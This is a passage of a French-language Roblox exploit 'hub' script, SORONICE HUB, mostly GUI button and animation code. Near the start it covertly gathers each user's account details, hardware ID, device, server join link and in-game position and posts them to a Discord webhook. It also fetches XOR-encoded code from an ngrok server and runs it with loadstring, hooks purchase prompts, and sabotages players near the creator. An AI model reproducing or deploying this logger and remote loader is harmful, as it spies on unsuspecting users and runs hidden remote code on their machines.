				if tonumber(bannedId) == LocalPlayer.UserId then
					LocalPlayer:Kick("You have been banned by the script creator for unknown reasons, but perhaps you upset them. This action is irrevocable. You are permanently banned from this script until the creator unbans you.")
					return true 
				end
			end
		end
		return false
	end
	
	if checkBanList() then return end
	
	-- ==========================================
	-- 1. DÉTECTION EXÉCUTEUR & HWID
	-- ==========================================
	local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
	local executorName = identifyexecutor and identifyexecutor() or "Exécuteur Inconnu"
	
	local hwid = "Non supporté par l'exécuteur"
	task.spawn(function()
		pcall(function() hwid = gethwid and gethwid() or get_hwid and get_hwid() or get_hardware_id and get_hardware_id() or hwid end)
	end)
	
	-- ==========================================
	-- 2. FONCTION WEBHOOK DISCORD (LOGGING COMPLET)
	-- ==========================================
	local function GetRealHeadShotAPI(userId)
		local fallbackImage = "https://tr.rbxcdn.com/53eb9b17fe1432a809c73a132d79f09c/420/420/Image/Png"
		if not httpRequest then return fallbackImage end
		local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..tostring(userId).."&size=420x420&format=Png&isCircular=false"
		local success, response = pcall(function() return httpRequest({ Url = url, Method = "GET" }) end)
		if success and response and response.Body then
			local data = HttpService:JSONDecode(response.Body)
			if data and data.data and data.data[1] and data.data[1].imageUrl then return data.data[1].imageUrl end
		end
		return fallbackImage
	end
	
	local function sendDiscordLog(isVip)
		if not httpRequest or webhookSent then return end
		webhookSent = true 
	
		task.spawn(function()
			local successGame, gameInfo = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
			local gameName = successGame and gameInfo.Name or "Nom du jeu inconnu"
			local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
			local webLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
			local playerCount = #Players:GetPlayers()
			local maxPlayers = Players.MaxPlayers
	
			local deviceType = "Ordinateur 💻"
			if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then deviceType = "Mobile / Tablette 📱"
			elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then deviceType = "Console 🎮"
			elseif UserInputService.VREnabled then deviceType = "Casque VR 🥽" end
	
			local ping = "Inconnu"
			pcall(function() ping = string.split(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1] .. " ms" end)
			local fps = tostring(math.floor(Workspace:GetRealPhysicsFPS())) .. " FPS"
	
			local accountAge = tostring(LocalPlayer.AccountAge) .. " jours"
			local isPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Oui 🌟" or "Non ❌"
			local playerTeam = LocalPlayer.Team and LocalPlayer.Team.Name or "Aucune / Neutre"
	
			local char = LocalPlayer.Character
			local humanoid = char and char:FindFirstChild("Humanoid")
			local rootPart = char and char:FindFirstChild("HumanoidRootPart")
	
			local walkSpeed = humanoid and tostring(math.floor(humanoid.WalkSpeed)) or "Inconnu"
			local jumpPower = humanoid and tostring(math.floor(humanoid.JumpPower)) or "Inconnu"
			local health = humanoid and tostring(math.floor(humanoid.Health)) .. " / " .. tostring(math.floor(humanoid.MaxHealth)) or "Inconnu"
	
			local positionTxt = "Inconnue"
			if rootPart then
				positionTxt = "X: " .. math.floor(rootPart.Position.X) .. ", Y: " .. math.floor(rootPart.Position.Y) .. ", Z: " .. math.floor(rootPart.Position.Z)
			end
	
			local moneyInfo = "Non détecté"
			if LocalPlayer:FindFirstChild("leaderstats") then
				local stats = {}
				for _, stat in ipairs(LocalPlayer.leaderstats:GetChildren()) do
					table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
				end
				if #stats > 0 then moneyInfo = table.concat(stats, " | ") end
			end
	
			local myAvatar = GetRealHeadShotAPI(LocalPlayer.UserId)
			local embedColor = isVip and 5763719 or 15548997
			local embedTitle = isVip and "🟢 INJECTION RÉUSSIE (ACCÈS VIP VALIDÉ)" or "🔴 INJECTION (EN ATTENTE DE VIP)"
			local embedDesc = "Le joueur a exécuté le script avec **" .. executorName .. "**.\n\n" .. (isVip and "✅ **Statut :** VIP Activé sur le site." or "❌ **Statut :** VIP Non activé.")
	
			local payload = {
				["username"] = "SORONICE Intel",
				["avatar_url"] = myAvatar,
				["content"] = "||@everyone|| **Nouveau log détecté !**", 
				["embeds"] = {{
					["title"] = embedTitle, ["description"] = embedDesc, ["color"] = embedColor, ["thumbnail"] = { ["url"] = myAvatar },
					["fields"] = {
						{["name"] = "👤 Pseudo", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
						{["name"] = "🏷️ Surnom", ["value"] = "```" .. LocalPlayer.DisplayName .. "```", ["inline"] = true},
						{["name"] = "🆔 ID Joueur", ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```", ["inline"] = true},
						{["name"] = "💻 HWID (Machine ID)", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
						{["name"] = "📅 Âge du Compte", ["value"] = accountAge, ["inline"] = true},
						{["name"] = "💎 Premium Roblox", ["value"] = isPremium, ["inline"] = true},
						{["name"] = "🖥️ Appareil", ["value"] = deviceType, ["inline"] = true},
						{["name"] = "📡 Ping", ["value"] = ping, ["inline"] = true},
						{["name"] = "🎞️ FPS", ["value"] = fps, ["inline"] = true},
						{["name"] = "🏳️ Équipe", ["value"] = playerTeam, ["inline"] = true},
						{["name"] = "🎮 Jeu Actuel", ["value"] = "**" .. gameName .. "**", ["inline"] = true},
						{["name"] = "👥 Joueurs", ["value"] = tostring(playerCount) .. " / " .. tostring(maxPlayers), ["inline"] = true},
						{["name"] = "🌍 PlaceId", ["value"] = "`" .. tostring(game.PlaceId) .. "`", ["inline"] = true},
						{["name"] = "❤️ Santé", ["value"] = health, ["inline"] = true},
						{["name"] = "🏃 Vitesse / Saut", ["value"] = walkSpeed .. " / " .. jumpPower, ["inline"] = true},
						{["name"] = "📍 Coordonnées Exactes", ["value"] = "`" .. positionTxt .. "`", ["inline"] = true},
						{["name"] = "💰 Leaderstats", ["value"] = "```" .. moneyInfo .. "```", ["inline"] = false},
						{["name"] = "🔗 Liens Rapides", ["value"] = "[🌐 Ouvrir la page web]("..webLink..")\n\n**🚀 Lien d'auto-rejoindre (PC) :**\n`" .. joinLink .. "`\n\n**🔑 JobId Brut :**\n`" .. game.JobId .. "`", ["inline"] = false}
					},
					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
					["footer"] = { ["text"] = "SORONICE HUB Logger • ID Serveur: " .. game.JobId }
				}}
			}
			httpRequest({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) })
		end)
	end
	
	-- ==========================================
	-- 3. GESTION VIP (MULTIVERSE SÉCURISÉ)
	-- ==========================================
	local function checkVIPStatus()
		local url = API_URL .. "?id=" .. tostring(LocalPlayer.UserId)
		if httpRequest then
			local success, response = pcall(function() return httpRequest({ Url = url, Method = "GET" }) end)
			if success and response and response.Body then
				local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(response.Body) end)
				if decodeSuccess then return decodedData end
			end
		else
			local success, result = pcall(function() return game:HttpGet(url) end)
			if success then
				local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(result) end)
				if decodeSuccess then return decodedData end
			end
		end
		return nil
	end
	
	local function handleVIP()
		local data = checkVIPStatus()
		if data and (data.action == "allow" or data.status == "active") then
			gui.Enabled = false
			_G.IsVipActive = true
	
			if not webhookSent then sendDiscordLog(true) end
	
			if not isHubLoaded then
				isHubLoaded = true
	
				-- === CONNEXION AU SERVEUR MULTIVERSE ===
				if httpRequest then
					local multiverseData = {
						place_id = tostring(game.PlaceId),
						hwid = hwid,
						userid = tostring(LocalPlayer.UserId)
					}
	
					local successReq, req = pcall(function()
						return httpRequest({
							Url = NGROK_MULTIVERSE,
							Method = "POST",
							Headers = {
								["Content-Type"] = "application/json",
								["ngrok-skip-browser-warning"] = "true"
							},
							Body = HttpService:JSONEncode(multiverseData)
						})
					end)
	
					if successReq and req and req.StatusCode == 200 then
						local successDecode, d = pcall(function() return HttpService:JSONDecode(req.Body) end)
						if successDecode and d.succes and d.code then
							-- DÉCODAGE XOR 90 DU CODE MULTIVERSE
							local tableau_nombres = d.code
							local caracteres = {}
							for i = 1, #tableau_nombres do
								caracteres[i] = string.char(bit32.bxor(tableau_nombres[i], 90))
							end
	
							local code_final = table.concat(caracteres)
							local executer, erreur = loadstring(code_final)
	
							if executer then
								executer()
							else
								warn("Erreur d'exécution Multiverse : " .. tostring(erreur))
							end
						end
					else
						warn("Multiverse : Impossible de contacter le serveur Python.")
					end
				else
					warn("Exécuteur non compatible pour contacter le Multiverse.")
				end
			end
	
			if not kickTimerStarted then
				kickTimerStarted = true
				local remainingMs = data.remainingMs or (4 * 60 * 60 * 1000)
				task.spawn(function()
					task.wait(remainingMs / 1000)
					LocalPlayer:Kick("Tes 4 heures de VIP sont terminées.")
				end)
			end
		else
			gui.Enabled = true 
			if not webhookSent then sendDiscordLog(false) end
			if _G.IsVipActive then LocalPlayer:Kick("Ton accès VIP vient d'expirer !") end
			_G.IsVipActive = false
		end
	end
	
	task.spawn(function()
		handleVIP()
		while true do
			if not _G.IsVipActive then task.wait(5) else task.wait(60) end
			pcall(handleVIP)
		end
	end)
	
	-- ==========================================
	-- 4. PROTECTION CRÉATEUR & BLOCAGE DES DONS
	-- ==========================================
	if LocalPlayer.UserId ~= ID_CREATEUR then
	
		-- 4A. BLOCAGE DES DONS (Pls Donate)
		local oldNamecall
		oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
			local method = getnamecallmethod()
			local args = {...}
	
			if not checkcaller() and self == MarketplaceService and (method == "PromptPurchase" or method == "PromptGamePassPurchase" or method == "PromptProductPurchase") then
				local itemId = args[2]
	
				task.spawn(function()
					local success, info = pcall(function() return MarketplaceService:GetProductInfo(itemId) end)
					if success and info then
						local targetId = (info.Creator and info.Creator.CreatorTargetId) or 0
						if targetId ~= ID_CREATEUR then
							pcall(function()
								StarterGui:SetCore("SendNotification", { Title = "SORONICE", Text = "Vous ne pouvez faire des dons qu'au créateur du script !", Duration = 5 })
							end)
						end
					end
				end)
			end
			return oldNamecall(self, ...)
		end))
	
		-- 4B. MODE INTOUCHABLE (Forcefield + Anti-Aim)
		local mouse = LocalPlayer:GetMouse()
		RunService.RenderStepped:Connect(function()
			local creatorPlayer = nil
			for _, p in ipairs(Players:GetPlayers()) do
				if p.UserId == ID_CREATEUR then
					creatorPlayer = p
					break
				end
			end
	
			if creatorPlayer and creatorPlayer.Character and creatorPlayer.Character:FindFirstChild("HumanoidRootPart") then
				local myChar = LocalPlayer.Character
				local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
	
				if myRoot then
					local creatorRoot = creatorPlayer.Character.HumanoidRootPart
					local distance = (myRoot.Position - creatorRoot.Position).Magnitude
					local humanoid = myChar:FindFirstChild("Humanoid")
	
					-- 1. Barrière de 20 studs
					if distance < 20 then
						local pushDirection = (myRoot.Position - creatorRoot.Position).Unit
						myRoot.CFrame = myRoot.CFrame + (pushDirection * 1.5)
						if humanoid then humanoid:UnequipTools() end
					end
	
					-- 2. Anti-Aim (Désarme si on te vise)
					if mouse.Target and mouse.Target:IsDescendantOf(creatorPlayer.Character) then
						if humanoid then humanoid:UnequipTools() end
					end
				end
			end
		end)
	end
end
coroutine.wrap(WFQPN_fake_script)()

local function PSHOU_fake_script() -- Mot de passe Stats.LocalScript
	local script = Instance.new('LocalScript', _i[1])
	script.Name = [[LocalScript]]

	print("Hello world!")
	
end
coroutine.wrap(PSHOU_fake_script)()

local function UTCHB_fake_script() -- X.LocalScript
	local script = Instance.new('LocalScript', _i[15])
	script.Name = [[LocalScript]]

	local button = script.Parent
	local gui = button:FindFirstAncestorOfClass("ScreenGui")
	local TweenService = game:GetService("TweenService")
	
	button.MouseButton1Click:Connect(function()
		if gui then
			local elements = gui:GetChildren() -- On récupère TOUT ce qui est dans le GUI
			local nombreElements = 0
			local termines = 0
	
			-- 1. On configure l'apparence de l'animation
			local infoSortie = TweenInfo.new(
				0.6, 
				Enum.EasingStyle.Back, 
				Enum.EasingDirection.In
			)
	
			for _, objet in pairs(elements) do
				-- On ne déplace que les choses visibles (Frame, Button, TextLabel, etc.)
				-- On ignore le script lui-même ou les dossiers
				if objet:IsA("GuiObject") then
					nombreElements = nombreElements + 1
	
					-- Calcul de la sortie à droite pour CET objet précis
					local positionSortie = UDim2.new(1.5, 0, objet.Position.Y.Scale, objet.Position.Y.Offset)
					local animation = TweenService:Create(objet, infoSortie, {Position = positionSortie})
	
					animation:Play()
	
					-- On compte quand chaque animation se termine
					animation.Completed:Connect(function()
						termines = termines + 1
						-- Une fois que le DERNIER objet a fini de bouger, on supprime tout
						if termines >= nombreElements then
							gui:Destroy()
						end
					end)
				end
			end
	
			-- Sécurité : Si le GUI est vide ou n'a pas d'objets animables
			if nombreElements == 0 then
				gui:Destroy()
			end
		end
	end)
	-----------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1 -- Taille normale (100%)
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.6, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.10, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(1.00, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.10, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(UTCHB_fake_script)()

local function FVERS_fake_script() -- Bouton Copier.Animation
	local script = Instance.new('LocalScript', _i[18])
	script.Name = [[Animation]]

	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(FVERS_fake_script)()

local function HFMBS_fake_script() -- Bouton Copier.Copy
	local script = Instance.new('LocalScript', _i[18])
	script.Name = [[Copy]]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local textToCopy = "https://v0-roblox-account-integration.vercel.app"
		
		-- Copie dans le presse-papiers
		pcall(function()
			setclipboard(textToCopy)
		end)
	end)
end
coroutine.wrap(HFMBS_fake_script)()

local function FBWAX_fake_script() -- ImageLabel.LocalScript
	local script = Instance.new('LocalScript', _i[26])
	script.Name = [[LocalScript]]

	local Players = game:GetService("Players")
	
	-- On récupère le joueur local (celui qui regarde son écran)
	local joueur = Players.LocalPlayer
	local imageLabel = script.Parent -- Ton ImageLabel
	
	-- On définit ce qu'on veut : juste la tête, en bonne qualité
	local typeImage = Enum.ThumbnailType.HeadShot
	local tailleImage = Enum.ThumbnailSize.Size420x420
	
	-- On demande à Roblox de récupérer le lien de l'image
	local imageURL, isReady = Players:GetUserThumbnailAsync(joueur.UserId, typeImage, tailleImage)
	
	-- Si l'image est prête et valide, on l'applique !
	if isReady then
		imageLabel.Image = imageURL
	else
		warn("Oups, impossible de charger la tête de " .. joueur.Name)
	end
end
coroutine.wrap(FBWAX_fake_script)()

local function TXGNY_fake_script() -- ?.LocalScript
	local script = Instance.new('LocalScript', _i[29])
	script.Name = [[LocalScript]]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		local success, err = pcall(function()
			loadstring(game:HttpGet('https://raw.githubusercontent.com/Audinay/code/refs/heads/main/README/Kdjfjfjfjfjfjr/Brjfjfbfjrjrfjrjrri/Hfhjfbfj.mml'))()		
		end)
	end)
	
	-----------------------------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(TXGNY_fake_script)()

local function KYTNS_fake_script() -- TextLabel.LocalScript
	local script = Instance.new('LocalScript', _i[33])
	script.Name = [[LocalScript]]

	local LocalizationService = game:GetService("LocalizationService")
	local Players = game:GetService("Players")
	
	local textLabel = script.Parent
	local player = Players.LocalPlayer
	
	-- On récupère le code de langue du joueur (ex: "fr-fr", "en-us", "es-es")
	local locale = LocalizationService.RobloxLocaleId
	
	-- Table de traduction professionnelle
	local translations = {
		["fr"] = "Appuyez sur ce bouton pour accéder au site, puis déverrouillez l'accès au script.",
		["en"] = "Press this button to proceed to the site and complete the unlocking process to access the script.",
		["es"] = "Presione este botón para acceder al sitio y completar el proceso de desbloqueo para acceder al script.",
		["pt"] = "Pressione este botão para acessar o site e concluir o processo de desbloqueio para acessar o script.",
		["de"] = "Drücken Sie diese Schaltfläche, um die Website aufzurufen und den Freischaltvorgang für das Skript abzuschließen.",
		["vi"] = "Nhấn nút này để truy cập trang web và hoàn tất quá trình mở khóa để truy cập script."
	}
	
	-- Fonction pour extraire le préfixe (ex: transforme "fr-fr" en "fr")
	local function getLanguagePrefix(localeId)
		return string.sub(localeId, 1, 2)
	end
	
	local langCode = getLanguagePrefix(locale)
	
	-- On applique la traduction correspondante, sinon on met de l'anglais par défaut
	if translations[langCode] then
		textLabel.Text = translations[langCode]
	else
		textLabel.Text = translations["en"] -- Langue par défaut si pays non listé
	end
end
coroutine.wrap(KYTNS_fake_script)()

local function EZWUG_fake_script() -- TextLabel.LocalScript
	local script = Instance.new('LocalScript', _i[36])
	script.Name = [[LocalScript]]

	local LocalizationService = game:GetService("LocalizationService")
	local Players = game:GetService("Players")
	
	local textLabel = script.Parent
	local player = Players.LocalPlayer
	
	-- On récupère le code de langue du joueur (ex: "fr-fr", "en-us", "es-es")
	local locale = LocalizationService.RobloxLocaleId
	
	-- Table de traduction professionnelle
	local translations = {
		["fr"] = "Script pour les jeux actuels.",
		["en"] = "Script for current games.",
		["es"] = "Script para los juegos actuales.",
		["pt"] = "Script para os jogos atuais.",
		["de"] = "Skript für die aktuellen Spiele.",
		["vi"] = "Script cho các trò chơi hiện tại."
	}
	
	-- Fonction pour extraire le préfixe (ex: transforme "fr-fr" en "fr")
	local function getLanguagePrefix(localeId)
		return string.sub(localeId, 1, 2)
	end
	
	local langCode = getLanguagePrefix(locale)
	
	-- On applique la traduction correspondante, sinon on met de l'anglais par défaut
	if translations[langCode] then
		textLabel.Text = translations[langCode]
	else
		textLabel.Text = translations["en"] -- Langue par défaut si pays non listé
	end
end
coroutine.wrap(EZWUG_fake_script)()

local function IFIUL_fake_script() -- TextLabel.LocalScript
	local script = Instance.new('LocalScript', _i[52])
	script.Name = [[LocalScript]]

	local RunService = game:GetService("RunService")
	local textLabel = script.Parent
	
	-- Recherche automatique des éléments pour pas te prendre la tête
	local stroke = textLabel:FindFirstChildWhichIsA("UIStroke")
	if not stroke then
		warn("Erreur : Il manque le UIStroke dans le TextLabel !")
		return
	end
	
	local gradient = stroke:FindFirstChildWhichIsA("UIGradient")
	if not gradient then
		warn("Erreur : Il manque le UIGradient dans le UIStroke !")
		return
	end
	
	-- Paramètres que tu peux modifier
	local vitesseRotation = 250 -- Vitesse du tour (plus c'est grand, plus ça va vite)
	local nombreDeClignotements = 3 -- Combien de fois ça clignote à la fin du tour
	local vitesseClignotement = 0.1 -- Temps en secondes entre chaque flash
	
	-- Boucle infinie pour l'animation complète
	task.spawn(function()
		while true do
			-- 1. FAIRE LE TOUR COMPLET (De 0 à 360 degrés)
			local rotationActuelle = 0
			gradient.Rotation = 0
	
			while rotationActuelle < 360 do
				-- On attend la prochaine frame et on calcule le temps passé (deltaTime)
				local deltaTime = RunService.RenderStepped:Wait()
				rotationActuelle = rotationActuelle + (vitesseRotation * deltaTime)
	
				-- On applique la rotation (en bloquant à 360 maximum pour finir le tour proprement)
				gradient.Rotation = math.min(rotationActuelle, 360)
			end
	
			-- Petite pause quand le tour est fini avant de clignoter
			task.wait(0.2)
	
			-- 2. CLIGNOTER
			for i = 1, nombreDeClignotements do
				stroke.Transparency = 1 -- Devient invisible
				task.wait(vitesseClignotement)
				stroke.Transparency = 0 -- Redevient visible
				task.wait(vitesseClignotement)
			end
	
			-- Petite pause avant de relancer un nouveau tour
			task.wait(0.5)
		end
	end)
end
coroutine.wrap(IFIUL_fake_script)()

local function CIZXN_fake_script() -- ImageLabel.LocalScript
	local script = Instance.new('LocalScript', _i[59])
	script.Name = [[LocalScript]]

	-- On récupère le service qui gère les entrées du joueur (Clavier, Souris, Tactile)
	local UserInputService = game:GetService("UserInputService")
	
	-- On définit les variables pour les éléments de ton interface graphique
	local imageLabelDeLInterface = script.Parent
	local texteDeLInterface = imageLabelDeLInterface:WaitForChild("pomlk1")
	
	-- On définit les variables pour tes IDs d'images exactes
	local imagePourLePC = "rbxassetid://121198413774602"
	local imagePourLeTelephone = "rbxassetid://107807340871451"
	
	-- On crée une fonction bien détaillée pour détecter l'appareil
	local function DetecterAppareilDuJoueur()
	
		-- On vérifie si l'appareil possède un écran tactile
		local possedeEcranTactile = UserInputService.TouchEnabled
	
		-- On vérifie si l'appareil possède un clavier physique connecté
		local possedeClavier = UserInputService.KeyboardEnabled
	
		-- On vérifie si l'appareil possède une souris connectée
		local possedeSouris = UserInputService.MouseEnabled
	
		-- On fait la condition pour savoir si c'est un téléphone
		-- Un téléphone a un écran tactile mais n'a pas de clavier physique intégré
		if possedeEcranTactile == true and possedeClavier == false then
	
			return "Telephone"
	
			-- Si ce n'est pas un téléphone, on considère que c'est un PC
		else
	
			return "PC"
	
		end
	
	end
	
	-- On crée une fonction pour appliquer l'image et le texte selon l'appareil détecté
	local function ActualiserLInterfaceGraphique()
	
		-- On appelle notre fonction de détection
		local appareilDetecte = DetecterAppareilDuJoueur()
	
		-- Si l'appareil détecté est un téléphone
		if appareilDetecte == "Telephone" then
	
			-- On met l'image du téléphone
			imageLabelDeLInterface.Image = imagePourLeTelephone
	
			-- On change le texte pour écrire téléphone
			texteDeLInterface.Text = "Téléphone"
	
			-- Si l'appareil détecté est un PC
		elseif appareilDetecte == "PC" then
	
			-- On met l'image du PC
			imageLabelDeLInterface.Image = imagePourLePC
	
			-- On change le texte pour écrire PC
			texteDeLInterface.Text = "PC"
	
		end
	
	end
	
	-- On lance la fonction finale une fois que le script est chargé
	ActualiserLInterfaceGraphique()
end
coroutine.wrap(CIZXN_fake_script)()

local function XCXDC_fake_script() -- Bouton discord.LocalScript
	local script = Instance.new('LocalScript', _i[62])
	script.Name = [[LocalScript]]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local textToCopy = "https://discord.gg/H9Umk4SvP"
	
		-- Copie dans le presse-papiers
		pcall(function()
			setclipboard(textToCopy)
		end)
	end)
	
	-----------------------------------------------------------------------------------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(XCXDC_fake_script)()

local function WHMRR_fake_script() -- Bouton discord.LocalScript
	local script = Instance.new('LocalScript', _i[62])
	script.Name = [[LocalScript]]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local success, err = pcall(function()
			getgenv().Titre = "SORONICE HUB"
			getgenv().Message = "You copied the Discord link"
			getgenv().Temps = 3
			getgenv().LD = 4 -- Active le dégradé animé !
	
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Audinay/GUI-MESSAGES/refs/heads/main/.lua"))()
		end)
		if not success then
			
		end
	end)
	
end
coroutine.wrap(WHMRR_fake_script)()

local function XXCYZ_fake_script() -- Bouton YouTube.LocalScript
	local script = Instance.new('LocalScript', _i[64])
	script.Name = [[LocalScript]]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local textToCopy = "https://www.youtube.com/@SORONICEv"
	
		-- Copie dans le presse-papiers
		pcall(function()
			setclipboard(textToCopy)
		end)
	end)
	
	-----------------------------------------------------------------------------------------------------------
	local TweenService = game:GetService("TweenService")
	
	local button = script.Parent
	
	-- 1. On crée un UIScale automatiquement s'il n'y en a pas déjà un
	local uiScale = button:FindFirstChild("UIScale")
	if not uiScale then
		uiScale = Instance.new("UIScale")
		uiScale.Parent = button
	end
	uiScale.Scale = 1
	
	-- 2. Configuration des animations (vitesse et style)
	local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
